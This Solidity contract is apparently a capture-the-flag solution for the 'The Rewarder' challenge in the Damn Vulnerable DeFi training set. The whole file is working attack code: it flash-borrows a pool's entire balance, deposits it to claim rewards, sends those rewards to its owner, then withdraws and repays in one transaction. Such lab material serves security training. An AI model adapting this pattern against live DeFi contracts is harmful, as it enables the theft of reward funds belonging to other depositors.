// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface DamnValuableToken_ {
    function balanceOf(address) external view returns (uint256);

    function transfer(address, uint256) external returns (bool);

    function approve(address, uint256) external returns (bool);
}

interface RewardToken_ {
    function balanceOf(address) external view returns (uint256);

    function transfer(address, uint256) external returns (bool);
}

interface FlashLoanerPool_ {
    function flashLoan(uint256) external;
}

interface TheRewarderPool_ {
    function deposit(uint256) external;

    function withdraw(uint256) external;
}

contract RewarderAttack {
    FlashLoanerPool_ public immutable loanPool;
    TheRewarderPool_ public immutable rewardPool;
    DamnValuableToken_ public immutable liquidityToken;
    RewardToken_ public immutable rewardToken;

    address public immutable owner;

    constructor(
        address loanPoolAddress,
        address rewardPoolAddress,
        address liquidityTokenAddress,
        address rewardTokenAddress
    ) {
        loanPool = FlashLoanerPool_(loanPoolAddress);
        rewardPool = TheRewarderPool_(rewardPoolAddress);
        liquidityToken = DamnValuableToken_(liquidityTokenAddress);
        rewardToken = RewardToken_(rewardTokenAddress);
        owner = msg.sender;
    }

    function attack() external {
        uint256 amount = liquidityToken.balanceOf(address(loanPool));
        loanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(loanPool), amount);
    }
}
